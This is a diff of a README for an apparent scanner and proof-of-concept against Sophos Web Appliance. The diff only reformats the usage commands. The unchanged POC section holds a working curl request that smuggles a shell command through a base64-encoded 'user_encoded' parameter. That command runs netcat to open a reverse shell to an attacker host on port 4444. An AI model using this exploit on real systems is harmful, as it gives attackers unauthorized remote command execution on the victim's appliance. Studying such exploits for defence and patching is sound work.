@@ -3,9 +3,10 @@
 	  title:"Sophos Web Appliance" <br/>
 	  
 ### Usage
-      chmod +x scanner.sh
-	  ./scanner.sh target.txt
-	  
+```
+chmod +x scanner.sh
+bash scanner.sh target.txt
+```  
 ### POC
 	  curl -k --trace-ascii % "https://victim_ip_addr/index.php?c=blocked&action=continue" -d "args_reason=filetypewarn&url=$RANDOM&filetype=$RANDOM&user=$RANDOM&user_encoded=$(echo -n "';nc -e /bin/sh attacker_ip_addr 4444 #" | base64)"
 
